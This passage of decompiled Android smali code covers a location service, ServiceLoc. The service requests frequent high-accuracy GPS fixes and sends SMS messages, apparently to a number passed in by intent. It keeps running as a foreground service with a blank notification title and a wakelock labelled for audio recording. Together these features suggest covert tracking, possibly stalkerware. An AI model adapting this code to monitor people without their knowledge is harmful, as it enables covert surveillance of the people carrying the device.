    invoke-virtual/range {v1 .. v6}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 2387
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 2390
    :goto_1
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    return-void
.end method

.method static synthetic e(Lcom/app/service/ServiceLoc;)Landroid/location/Location;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    return-object p0
.end method

.method static synthetic f(Lcom/app/service/ServiceLoc;)Lcom/google/android/gms/location/LocationRequest;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    return-object p0
.end method

.method static synthetic g(Lcom/app/service/ServiceLoc;)Ljava/lang/Runnable;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->m:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic h(Lcom/app/service/ServiceLoc;)Landroid/os/Handler;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->l:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic i(Lcom/app/service/ServiceLoc;)Ljava/lang/Runnable;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->o:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic j(Lcom/app/service/ServiceLoc;)Landroid/os/Handler;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->n:Landroid/os/Handler;

    return-object p0
.end method

.method static synthetic k(Lcom/app/service/ServiceLoc;)Ljava/lang/Runnable;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->q:Ljava/lang/Runnable;

    return-object p0
.end method

.method static synthetic l(Lcom/app/service/ServiceLoc;)Landroid/os/Handler;
    .locals 0

    .line 43
    iget-object p0, p0, Lcom/app/service/ServiceLoc;->p:Landroid/os/Handler;

    return-object p0
.end method


# virtual methods
.method public final a(I)V
    .locals 0

    .line 233
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->b()V

    return-void
.end method

.method public final a(Landroid/location/Location;)V
    .locals 2

    .line 210
    :try_start_0
    iput-object p1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 212
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->j:Landroid/os/Handler;

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->k:Ljava/lang/Runnable;

    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 213
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->l:Landroid/os/Handler;

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->m:Ljava/lang/Runnable;

    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 214
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->n:Landroid/os/Handler;

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->o:Ljava/lang/Runnable;

    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 215
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->p:Landroid/os/Handler;

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->q:Ljava/lang/Runnable;

    invoke-virtual {p1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 217
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->d()Z

    move-result p1

    if-eqz p1, :cond_0

    .line 218
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->c()V

    .line 220
    :cond_0
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->c()V

    .line 1274
    new-instance p1, Ljava/lang/Thread;

    new-instance v0, Lcom/app/service/ServiceLoc$1;

    invoke-direct {v0, p0}, Lcom/app/service/ServiceLoc$1;-><init>(Lcom/app/service/ServiceLoc;)V

    invoke-direct {p1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 1296
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 224
    invoke-static {}, Lcom/crashlytics/android/Crashlytics;->getInstance()Lcom/crashlytics/android/Crashlytics;

    move-result-object v0

    iget-object v0, v0, Lcom/crashlytics/android/Crashlytics;->core:Lcom/crashlytics/android/core/CrashlyticsCore;

    const-string v1, "Localization-onDestroy"

    invoke-virtual {v0, v1}, Lcom/crashlytics/android/core/CrashlyticsCore;->log(Ljava/lang/String;)V

    .line 225
    invoke-static {p1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 226
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    return-void
.end method

.method public final a(Landroid/os/Bundle;)V
    .locals 1
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .line 196
    :try_start_0
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    if-nez p1, :cond_0

    iget-object p1, p0, Lcom/app/service/ServiceLoc;->s:Ljava/lang/String;

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/app/service/ServiceLoc;->s:Ljava/lang/String;

    const-string v0, "3"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 197
    sget-object p1, Lwl;->b:Lwj;

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-interface {p1, v0}, Lwj;->a(Lfk;)Landroid/location/Location;

    move-result-object p1

    iput-object p1, p0, Lcom/app/service/ServiceLoc;->i:Landroid/location/Location;

    .line 200
    :cond_0
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->b()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 202
    invoke-static {p1}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 203
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    return-void
.end method

.method public final a(Lez;)V
    .locals 2

    .line 238
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Connection failed: ConnectionResult.getErrorCode() = "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 2021
    iget p1, p1, Lez;->b:I

    .line 238
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0
    .annotation build Landroid/support/annotation/Nullable;
    .end annotation

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    .line 72
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const/4 v0, 0x1

    .line 75
    :try_start_0
    invoke-static {v0}, Lu;->a(Z)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 77
    invoke-virtual {v1}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 81
    :goto_0
    :try_start_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-ge v1, v2, :cond_0

    .line 82
    invoke-static {p0}, Landroid/support/v4/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroid/support/v4/app/NotificationManagerCompat;

    move-result-object v1

    invoke-virtual {v1}, Landroid/support/v4/app/NotificationManagerCompat;->areNotificationsEnabled()Z

    move-result v1

    if-nez v1, :cond_1

    .line 83
    :cond_0
    new-instance v1, Landroid/app/Notification$Builder;

    invoke-direct {v1, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    const-string v3, " "

    .line 84
    invoke-virtual {v1, v3}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    const v3, 0x7f080079

    .line 85
    invoke-virtual {v1, v3}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 86
    invoke-virtual {v1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const v3, 0xe2cb

    .line 88
    invoke-virtual {p0, v3, v1}, Lcom/app/service/ServiceLoc;->startForeground(ILandroid/app/Notification;)V

    .line 91
    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    if-ge v1, v2, :cond_2

    :try_start_2
    const-string v1, "power"

    .line 93
    invoke-virtual {p0, v1}, Lcom/app/service/ServiceLoc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/os/PowerManager;

    if-eqz v1, :cond_2

    const-string v2, "MyWakeLockRecordAudio"

    .line 96
    invoke-virtual {v1, v0, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;

    .line 97
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;

    const-wide/16 v1, 0x2710

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 100
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_1

    :catch_2
    move-exception v0

    .line 104
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 105
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    .line 108
    :cond_2
    :goto_1
    new-instance v0, Lcom/app/service/ServiceLoc$a;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/app/service/ServiceLoc$a;-><init>(Lcom/app/service/ServiceLoc;B)V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->k:Ljava/lang/Runnable;

    .line 109
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->j:Landroid/os/Handler;

    .line 111
    new-instance v0, Lcom/app/service/ServiceLoc$c;

    invoke-direct {v0, p0, v1}, Lcom/app/service/ServiceLoc$c;-><init>(Lcom/app/service/ServiceLoc;B)V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->m:Ljava/lang/Runnable;

    .line 112
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->l:Landroid/os/Handler;

    .line 114
    new-instance v0, Lcom/app/service/ServiceLoc$b;

    invoke-direct {v0, p0, v1}, Lcom/app/service/ServiceLoc$b;-><init>(Lcom/app/service/ServiceLoc;B)V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->o:Ljava/lang/Runnable;

    .line 115
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->n:Landroid/os/Handler;

    .line 117
    new-instance v0, Lcom/app/service/ServiceLoc$d;

    invoke-direct {v0, p0, v1}, Lcom/app/service/ServiceLoc$d;-><init>(Lcom/app/service/ServiceLoc;B)V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->q:Ljava/lang/Runnable;

    .line 118
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/app/service/ServiceLoc;->p:Landroid/os/Handler;

    .line 120
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->a()V

    return-void
.end method

.method public onDestroy()V
    .locals 3

    .line 243
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 246
    :try_start_0
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 247
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    const/4 v0, 0x0

    .line 248
    iput-object v0, p0, Lcom/app/service/ServiceLoc;->v:Landroid/os/PowerManager$WakeLock;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 251
    invoke-virtual {v0}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 255
    :cond_0
    :goto_0
    :try_start_1
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {v0}, Lfk;->d()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 256
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->c()V

    .line 257
    iget-object v0, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {v0}, Lfk;->c()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    .line 260
    invoke-static {}, Lcom/crashlytics/android/Crashlytics;->getInstance()Lcom/crashlytics/android/Crashlytics;

    move-result-object v1

    iget-object v1, v1, Lcom/crashlytics/android/Crashlytics;->core:Lcom/crashlytics/android/core/CrashlyticsCore;

    const-string v2, "Localization-onDestroy"

    invoke-virtual {v1, v2}, Lcom/crashlytics/android/core/CrashlyticsCore;->log(Ljava/lang/String;)V

    .line 261
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    :cond_1
    :goto_1
    const/4 v0, 0x0

    .line 264
    sput-boolean v0, Lcom/app/service/ServiceLoc;->a:Z

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2

    const/4 p2, 0x1

    .line 126
    :try_start_0
    sput-boolean p2, Lcom/app/service/ServiceLoc;->a:Z

    if-eqz p1, :cond_4

    .line 129
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    if-eqz p1, :cond_4

    const-string p2, "idLog"

    .line 132
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, Lcom/app/service/ServiceLoc;->r:Ljava/lang/String;

    const-string p2, "mType"

    .line 133
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p0, Lcom/app/service/ServiceLoc;->s:Ljava/lang/String;

    const-string p2, "numberTel"

    .line 134
    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/app/service/ServiceLoc;->t:Ljava/lang/String;

    .line 1170
    new-instance p1, Lcom/google/android/gms/location/LocationRequest;

    invoke-direct {p1}, Lcom/google/android/gms/location/LocationRequest;-><init>()V

    iput-object p1, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    .line 1171
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    const-wide/16 p2, 0x3e8

    invoke-virtual {p1, p2, p3}, Lcom/google/android/gms/location/LocationRequest;->a(J)Lcom/google/android/gms/location/LocationRequest;

    .line 1172
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    const-wide/16 p2, 0x1f4

    invoke-virtual {p1, p2, p3}, Lcom/google/android/gms/location/LocationRequest;->b(J)Lcom/google/android/gms/location/LocationRequest;

    .line 1174
    invoke-static {p0}, Lda;->k(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_1

    iget-object p1, p0, Lcom/app/service/ServiceLoc;->t:Ljava/lang/String;

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/app/service/ServiceLoc;->t:Ljava/lang/String;

    const-string p2, "Active"

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    .line 1178
    :cond_0
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    const/16 p2, 0x66

    invoke-virtual {p1, p2}, Lcom/google/android/gms/location/LocationRequest;->a(I)Lcom/google/android/gms/location/LocationRequest;

    .line 1179
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->l:Landroid/os/Handler;

    iget-object p2, p0, Lcom/app/service/ServiceLoc;->m:Ljava/lang/Runnable;

    const-wide/16 v0, 0x7530

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    .line 1175
    :cond_1
    :goto_0
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->h:Lcom/google/android/gms/location/LocationRequest;

    const/16 p2, 0x64

    invoke-virtual {p1, p2}, Lcom/google/android/gms/location/LocationRequest;->a(I)Lcom/google/android/gms/location/LocationRequest;

    .line 1176
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->j:Landroid/os/Handler;

    iget-object p2, p0, Lcom/app/service/ServiceLoc;->k:Ljava/lang/Runnable;

    const-wide/32 v0, 0xea60

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 138
    :goto_1
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    if-eqz p1, :cond_3

    .line 139
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->d()Z

    move-result p1

    if-eqz p1, :cond_2

    .line 140
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->b()V

    goto :goto_2

    .line 142
    :cond_2
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->b()V

    goto :goto_2

    .line 145
    :cond_3
    invoke-direct {p0}, Lcom/app/service/ServiceLoc;->a()V

    .line 146
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    if-eqz p1, :cond_4

    .line 147
    iget-object p1, p0, Lcom/app/service/ServiceLoc;->g:Lfk;

    invoke-virtual {p1}, Lfk;->b()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception p1

    .line 153
    invoke-virtual {p1}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 154
    invoke-virtual {p0}, Lcom/app/service/ServiceLoc;->stopSelf()V

    :cond_4
    :goto_2
    const/4 p1, 0x2

    return p1
.end method
